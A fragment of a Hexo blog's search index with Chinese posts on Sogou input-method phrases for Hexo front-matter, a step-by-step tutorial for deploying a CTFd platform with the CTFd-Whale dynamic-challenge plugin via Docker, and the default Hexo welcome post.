      <title>搜狗输入法自动创建Page Front-matter</title>
      <link href="/2021/12/26/Hexo/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%9B%E5%BB%BAPage-Front-matter/"/>
      <url>/2021/12/26/Hexo/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%9B%E5%BB%BAPage-Front-matter/</url>
      
        <content type="html"><![CDATA[<h1 id="搜狗输入法自动创建Page-Front-matter"><a href="#搜狗输入法自动创建Page-Front-matter" class="headerlink" title="搜狗输入法自动创建Page Front-matter"></a>搜狗输入法自动创建Page Front-matter</h1><p>所示，本章的header就是我输入“ifm”三个字母并按下空格自动创建的内容。其中包含了Hexo post的所有参数，并且自动生成了文章id、文章的创建时间、更新时间以及文章的永久链接：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/d3eb0de8dddcda417311e714f9709520.gif" alt="img"></p><p>由于每次写文章都要写Page Front-matter，非常麻烦，每次都需要写许多重复的内容。类似于：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 搜狗输入法自动创建Page Front-matter</span><br><span class="line">categories:</span><br><span class="line">  - Hexo</span><br><span class="line">tags:</span><br><span class="line">  - Hexo</span><br><span class="line">date: 2021-12-26 15:27:47</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>通过使用搜狗输入法自定义短语的时间戳语法（理论上国产的拼音输入法都有此功能），你可以快速、简洁地创建文章的header内容。</p><h2 id="搜狗输入法自定义短语的时间戳语法"><a href="#搜狗输入法自定义短语的时间戳语法" class="headerlink" title="搜狗输入法自定义短语的时间戳语法"></a>搜狗输入法自定义短语的时间戳语法</h2><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211226234405762.png" alt="image-20211226234405762"></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211226235230142.png" alt="image-20211226235230142"></p><p>搜狗输入法自带短语</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;  函数    含义    举例</span><br><span class="line">;  <span class="variable">$year</span>    年(4位) 2006、2008</span><br><span class="line">;  <span class="variable">$year_yy</span>年(2位) 06、08</span><br><span class="line">;  <span class="variable">$month</span>     月      12、8、3</span><br><span class="line">;  <span class="variable">$month_mm</span>  月      12、08、03//此函数在输入法3.1版之后（含）有效</span><br><span class="line">;  <span class="variable">$day</span>     日      3、13、22</span><br><span class="line">;  <span class="variable">$day_dd</span>日       03、13、22//此函数在输入法3.1版之后（含）有效</span><br><span class="line">;  <span class="variable">$weekday</span> 星期    0、1、2、5、6</span><br><span class="line">;  <span class="variable">$fullhour</span>时(24小时制)  2、8、13、23</span><br><span class="line">;  <span class="variable">$fullhour_hh</span>时(24小时制)  02、08、13、23//此函数在输入法3.1版之后（含）有效</span><br><span class="line">;  <span class="variable">$halfhour</span>时(12小时制)2、8、10、11</span><br><span class="line">;  <span class="variable">$halfhour_hh</span>时(12小时制)02、08、10、11//此函数在输入法3.1版之后（含）有效</span><br><span class="line">;  <span class="variable">$ampm</span>    AM、PM(英)AM、PM（大写）</span><br><span class="line">;  <span class="variable">$minute</span>  分      02、08、15、28</span><br><span class="line">;  <span class="variable">$second</span>  秒      02、08、15、28</span><br><span class="line">;  <span class="variable">$year_cn</span> 年(中文4位)二〇〇六</span><br><span class="line">;  <span class="variable">$year_yy_cn</span>年(中文2位)〇六</span><br><span class="line">;  <span class="variable">$month_cn</span>月(中文)十二、八、三</span><br><span class="line">;  <span class="variable">$day_cn</span>  日(中文)三、十三、二十二</span><br><span class="line">;  <span class="variable">$weekday_cn</span> 星期(中文)日、一、二、五、六</span><br><span class="line">;  <span class="variable">$fullhour_cn</span>时(中文24时制)二、八、十三、二十三</span><br><span class="line">;  <span class="variable">$halfhour_cn</span>时(中文12时制)二、八、一、十一</span><br><span class="line">;  <span class="variable">$ampm_cn</span> 上午下午(中文)上午、下午</span><br><span class="line">;  <span class="variable">$minute_cn</span>分(中文)零二、零八、十五、二十八</span><br><span class="line">;  <span class="variable">$second_cn</span>秒(中文)零二、零八、十五、二十八</span><br><span class="line">;  具体你可以参考这个文件最下面的例子，实际体验一下就明白了。</span><br><span class="line">;  你可以用自定义短语来做一个带动态时间的多行回信落款。</span><br><span class="line">;  ss,1=<span class="comment">#$year年$month月$day_dd日 $fullhour:$minute:$second</span></span><br></pre></td></tr></table></figure><p>按照语法添加新短语即可</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211226235416804.png" alt="image-20211226235416804"></p><p>我添加的自定义短语</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211226235754970.png" alt="image-20211226235754970"></p><p>缩写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifm</span><br></pre></td></tr></table></figure><p>短语</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#---</span></span><br><span class="line">title: </span><br><span class="line">categories: </span><br><span class="line">tags: </span><br><span class="line">  - </span><br><span class="line">  - </span><br><span class="line">date: <span class="variable">$year</span>-<span class="variable">$month_mm</span>-<span class="variable">$day_dd</span> <span class="variable">$fullhour</span>:<span class="variable">$minute</span>:<span class="variable">$second</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>上面缩写是自己打出来的缩写，出现的第一个（候选位置）就是下面的结果</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在文本框打出ifm，按 ‘1’ 键查看结果</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211226235953546.png" alt="image-20211226235953546"></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227000132699.png" alt="image-20211227000132699"></p><p>如果出现了这样的结果说明成功了</p><p><strong>PS：我用的typora打开，所以前面和后面的“—”转换成了一个边框</strong></p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd+CTFd-whale动态靶场搭建</title>
      <link href="/2021/12/25/CTF/CTFd+CTFd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
      <url>/2021/12/25/CTF/CTFd+CTFd-whale%E5%8A%A8%E6%80%81%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFd-CTFd-whale动态靶场搭建"><a href="#CTFd-CTFd-whale动态靶场搭建" class="headerlink" title="CTFd+CTFd-whale动态靶场搭建"></a>CTFd+CTFd-whale动态靶场搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>目前CTFd平台的搭建教程网上有很多，但也有部分写的水，不够详细，跟着那些教程部署完多多少少还是会出现不少问题，从而导致部署失败，既浪费了时间精力不说还多多少少影响了学习的进度，有这个功夫在这多折腾平台，还不如多做两道Web题目呢~</p><p>由于学校社团内部学习交流的需要，本人在经过两天的折腾学习后，结合各位前辈所写的的教程，终于成功搭建了<strong>最新的版本的CTFd</strong>，同时使用<strong>CTFd-Whale</strong>支持<strong>动态靶场环境</strong>。</p><p>本教程基于 <strong>Ubuntu14.02 + Docker + Docker Compose</strong>部署，采用最新的<strong>CTFd v3.3.1</strong>安装，文章最后更新日期为 2021.12.25</p><p>如遇到网络环境不佳，导致下载安装速度过慢，请尝试换源、科学上网等。</p><p>本文使用的是@M1kasu已经对<strong>CTFd v3.3.1</strong>官方源码进行了更换国内镜像源、添加CTFd-Whale子模块、配置frp网络、设置静态文件CDN加速等工作，可前往使用M1kasu修改的版本进行安装部署。请前往获取：<a href="https://github.com/M1kasu/CTFd">https://github.com/M1kasu/CTFd</a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><strong>使用的服务器版本：Ubuntu 21.10/Ubuntu 20.04 LTS</strong></p><p><strong>软件版本：Docker version 20.10.11, build dea9396</strong></p><p><strong>docker-compose version 1.29.2, build 5becea4c</strong></p><p>测试环境：谷歌云</p><p>不建议用虚拟机搭建，同样的办法我在虚拟机上没有搭建成功，建议使用云服务器</p><p><strong>=======================================================</strong></p><h3 id="系统换源"><a href="#系统换源" class="headerlink" title="系统换源"></a>系统换源</h3><p>由于本人的环境为<strong>腾讯云Ubuntu14.02</strong>，故只针对此系统进行换源。</p><p><strong>由于腾讯云自带腾讯云源，所以不需要换源就很快。</strong></p><p><strong>如果是虚拟机搭建就必须要换源。</strong></p><p>具体方法如下：</p><p>Ubuntu系统中，软件源文件地址为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/apt/sources.list</span><br></pre></td></tr></table></figure><p><strong>1.备份原来的源，将以前的源备份一下，以防以后可以用的。</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure><p><strong>2.打开/etc/apt/sources.list文件，在前面添加如下条目，并保存。</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>（可将vim更换为自己熟悉的编辑器）</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#添加阿里源</span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p><strong>3.更新</strong></p><p>更新源</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>如出现依赖问题，解决方式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get -f install</span><br></pre></td></tr></table></figure><p>更新软件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><p>更改完 sources.list 文件后请运行 sudo apt-get update 更新索引以生效。</p><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git -y</span><br></pre></td></tr></table></figure><h3 id="Docker环境安装"><a href="#Docker环境安装" class="headerlink" title="Docker环境安装"></a>Docker环境安装</h3><p><strong>更新软件列表</strong></p><p>安装前记得先更新一下软件源和软件列表，不然可能会报错</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><p><strong>安装docker</strong></p><p>通过版本安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">更新系统包索引</span><br><span class="line">sudo apt-get update</span><br><span class="line">添加HTTPS协议，允许apt从HTTPS安装软件包</span><br><span class="line">sudo apt-get install  apt-transport-https  ca-certificates curl  software-properties-common</span><br><span class="line">添加Docker公共密钥 Docker 官方源</span><br><span class="line">curl -fsSL  https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add</span><br><span class="line">设置版本库类型，软件版本包括三种： stable、edge、<span class="built_in">test</span></span><br><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64]  https://download.docker.com/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br><span class="line">安装最新版docker-ce</span><br><span class="line">sudo apt-get install docker-ce</span><br><span class="line">设置开机自启动并启动docker</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="Docker-Compose安装"><a href="#Docker-Compose安装" class="headerlink" title="Docker-Compose安装"></a>Docker-Compose安装</h3><p>通过GitHub安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入https://github.com/docker/compose/releases 查看最新版本。</span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.26.2/docker-compose-`uname -s`-`uname -m` -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">设置权限</span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">查看是否安装成功</span><br><span class="line">docker-compose --version</span><br><span class="line">出现docker-compose version 1.26.2即安装成功</span><br></pre></td></tr></table></figure><p><strong>设置docker镜像加速</strong></p><p>这个是需要设置的</p><ul><li>进入阿里云容器镜像服务:<a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></li><li>根据底下配置方法进行配置</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://******.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>通过<strong>docker –version</strong>来验证Docker安装是否成功</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker --version</span><br></pre></td></tr></table></figure><p>如果能正常返回版本信息，那么恭喜你现在已经完成了环境准备环节，加油！</p><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><p><strong>本文针对的是最新版CTFd 3.3.1及CTFd-whale的教程，若不需要配置CTFd-Whale，请移步官方教程。</strong></p><h3 id="Docker集群设置"><a href="#Docker集群设置" class="headerlink" title="Docker集群设置"></a>Docker集群设置</h3><p><strong>1、启用Docker Swarm，并为生成的Manager节点取一个别名</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker swarm init<span class="comment"># 初始化</span></span><br><span class="line">docker node ls<span class="comment"># 查看节点ID</span></span><br><span class="line">docker node update --label-add name=linux-1 &lt;节点 ID&gt;  <span class="comment"># 添加别名</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227111036360.png" alt="image-20211227111036360"></p><h3 id="下载CTFd修改版"><a href="#下载CTFd修改版" class="headerlink" title="下载CTFd修改版"></a><strong>下载CTFd修改版</strong></h3><p>博主已经对CTFd v3.3.1官方源码进行了更换国内镜像源、添加CTFd-Whale子模块、配置frp网络、设置静态文件CDN加速等工作，可前往使用作者修改的版本进行安装部署。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b frp https://github.com/M1kasu/CTFd.git<span class="comment"># 修改版（根目录不建议修改名字）</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">git submodule update --init <span class="comment"># 更新CTFd-Whale子模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ——————————————————————————————————————————————————————</span></span><br><span class="line"><span class="comment"># 如果你访问Github的速度不佳，也可以使用别人提供的CSDN和Gitee版（可选）</span></span><br><span class="line">git <span class="built_in">clone</span> -b https://codechina.csdn.net/vicosna/CTFd.git<span class="comment"># CSDN</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">sed -i <span class="string">&#x27;s/github.com/codechina.csdn.net/g&#x27;</span> .gitmodules<span class="comment"># 修改子模块Url</span></span><br><span class="line">git submodule update --init <span class="comment"># 更新CTFd-Whale子模块</span></span><br><span class="line"><span class="comment"># ——————————————————————————————————————————————————————</span></span><br><span class="line">git <span class="built_in">clone</span> -b frp https://gitee.com/vicosna/CTFd.git<span class="comment"># Gitee</span></span><br><span class="line"><span class="built_in">cd</span> CTFd<span class="comment"># 进入CTFd目录</span></span><br><span class="line">sed -i <span class="string">&#x27;s/github.com/gitee.com/g&#x27;</span> .gitmodules<span class="comment"># 修改子模块Url</span></span><br><span class="line">git submodule update --init </span><br></pre></td></tr></table></figure><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>运行<strong>docker-compose build</strong>命令，等待结果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure><p>如果修改的各配置文件没有错误的话，那么应该就会返回 <strong>Successfully tagged ctfd_ctfd:latest~</strong></p><h2 id="部署容器"><a href="#部署容器" class="headerlink" title="部署容器"></a>部署容器</h2><p>运行<strong>docker-compose up -d</strong>部署容器，耐心等待~</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>我们再来使用docker ps -a查看一下当前正在运行的容器是否都正常。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227111934919.png" alt="image-20211227111934919"></p><p>访问你的服务器的公网IP就能打开平台界面啦，由于CTFd最新版启用了nginx端口转发，我们直接访问80端口即可，当然CTFd的默认端口8000也可以访问。</p><p>Hint: 对于Docker的两条命令docker-compose build 和 docker-compose up -d ，我们可以将它们合起来写成一句命令 </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure><h2 id="后续配置"><a href="#后续配置" class="headerlink" title="后续配置"></a>后续配置</h2><p>进入平台后的账号主题相关配置请自行设置，这里我们主要提一下根据本教程安装的CTFd-Whale的配置（别的教程可能不能保证完全适用）如果你使用的是本人修改集成CTFd-Whale插件的CTFd版本，那么插件设置处只需要修公网IP和HTTP域名即可。</p><p>进入后台CTFd-Whale插件的Frp标签下</p><p><strong>第一处：Http Domain Suffix（HTTP模式域名）</strong></p><p>此处填写的域名为Frp容器的节点域名，并非为CTFd平台的域名，（请先将该节点域名泛解析到本服务器的IP上）</p><p>例如 ***.node.yuyapeng.cn | A | xxx.xxx.xxx.xxx** ，不同DNS服务商操作或许不一样。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227112254759.png" alt="image-20211227112254759"></p><p>然后在<strong>CTFd-Whale</strong>插件设置里设置<strong>node.yuyapeng.cn</strong>，这里填写的域名不需要填写 *.</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227112534000.png" alt="image-20211227112534000"></p><p><strong>第二处：Direct IP Address（服务器公网IP）</strong></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227112725596.png" alt="image-20211227112725596"></p><p>如果你修改了其他配置，例如CTFd根目录的文件夹名称可能会导致容器名称变化，或是Swarm节点别名，导致无法正常启动靶场，请参照CTFd-Whale完整配置信息表自行修改。</p><table><thead><tr><th>属性</th><th>配置</th></tr></thead><tbody><tr><td>Docker API URL</td><td>unix://var/run/docker.sock</td></tr><tr><td>Frp API IP</td><td>frpc的ip配置</td></tr><tr><td>Frp API Port</td><td>frpc的端口配置</td></tr><tr><td>Frp Http Domain Suffix</td><td>Docker API URL to connect（可填None）</td></tr><tr><td>Frp Http Port</td><td>80</td></tr><tr><td>Frp Direct IP Address</td><td>你的公网ip，本机即为127.0.0.1</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最小端口呼应</td></tr><tr><td>Frp Direct Minimum Port</td><td>与之前frps最大端口呼应</td></tr><tr><td>Max Container Count</td><td>不超过最大-最小</td></tr><tr><td>Max Renewal Times</td><td>最大实例延时次数</td></tr><tr><td>Frp config template</td><td>填入frps的配置，只需填[common]</td></tr><tr><td>Docker Auto Connect Containers</td><td>ctfd_frpc_1</td></tr><tr><td>Docker Dns Setting</td><td>可填机器内DNS，没有可填个外网DNS</td></tr><tr><td>Docker Swarm Nodes</td><td>linux-1 与前面swarm集群呼应</td></tr><tr><td>Docker Multi-Container Network Subnet</td><td>内网题大子网ip配置/CIDR</td></tr><tr><td>Docker Multi-Container Network Subnet New Prefix</td><td>每个内网题实例的CIDR</td></tr><tr><td>Docker Container Timeout</td><td>单位为秒</td></tr></tbody></table><h2 id="题目测试"><a href="#题目测试" class="headerlink" title="题目测试"></a>题目测试</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Challenge Type题目类型选择dynamic_docker</span><br><span class="line">Name题目名字</span><br><span class="line">Category题目分类</span><br><span class="line">Initial Value初始分值</span><br><span class="line">Decay Value递减分值</span><br><span class="line">Minimum Value最小分值</span><br><span class="line">Docker Image支持动态flag的镜像</span><br><span class="line">Frp Http Portfrps http开放的端口</span><br><span class="line">Frp Redirect Type没有域名选择Direct</span><br><span class="line">Frp Redirect Port转发到靶机容器的端口</span><br><span class="line">Score Type是否启用动态分数</span><br></pre></td></tr></table></figure><p>这里我们使用 ctftraining/qwb_2019_supersqli 进行测试，添加题目后进行访问。</p><p>添加题目过程参考下图：</p><p><strong>Direct模式：</strong></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227113346021.png" alt="image-20211227113346021"></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227113358354.png" alt="image-20211227113358354"></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227113513830.png" alt="image-20211227113513830"></p><p><strong>http模式：</strong></p><p>将模式改成http，其他的都一样</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211227113646321.png" alt="image-20211227113646321"></p><p>如果两种模式下都能正常访问容器，那么恭喜你现在CTFd最新版本你已经成功部署啦~</p><p>由于使用的是我改良集成版本的CTFd，目前来看可以一气呵成的的部署成功~</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.vicosna.com/posts/ctfd/">https://www.vicosna.com/posts/ctfd/</a></p><p><a href="https://blog.csdn.net/qq_44747972/article/details/111183971">https://blog.csdn.net/qq_44747972/article/details/111183971</a></p><p><a href="https://blog.csdn.net/qq_35948609/article/details/121532200">https://blog.csdn.net/qq_35948609/article/details/121532200</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF</title>
      <link href="/2021/12/25/CTF/Web/CTF/"/>
      <url>/2021/12/25/CTF/Web/CTF/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/12/24/hello-world/"/>
      <url>/2021/12/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
